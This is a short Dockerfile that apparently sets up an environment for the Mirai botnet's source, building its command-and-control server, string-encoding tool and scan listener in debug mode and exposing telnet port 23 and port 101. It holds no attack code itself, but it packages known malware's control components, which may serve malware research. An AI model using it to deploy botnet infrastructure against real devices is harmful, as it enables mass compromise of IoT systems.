FROM golang:1.19-bullseye

# Install dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    electric-fence \
    mysql-client \
    telnet \
    netcat \
    vim \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy mirai source
COPY mirai /app/mirai

# Build CNC and tools in debug mode
WORKDIR /app/mirai
RUN mkdir -p debug && \
    gcc -std=c99 tools/enc.c -g -o debug/enc && \
    go build -o debug/cnc cnc/*.go && \
    go build -o debug/scanListen tools/scanListen.go

# Expose ports
EXPOSE 23 101

CMD ["/bin/bash"]
